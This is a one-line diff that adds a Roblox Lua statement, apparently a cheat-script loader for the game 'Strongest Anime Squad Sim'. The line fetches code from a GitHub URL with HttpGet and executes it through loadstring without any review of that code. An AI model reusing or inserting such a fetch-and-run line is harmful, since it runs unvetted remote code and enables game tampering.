@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Xv3nm/lua-rblx-repo/main/Games/Strongest%20Anime%20Squad%20Sim"))()
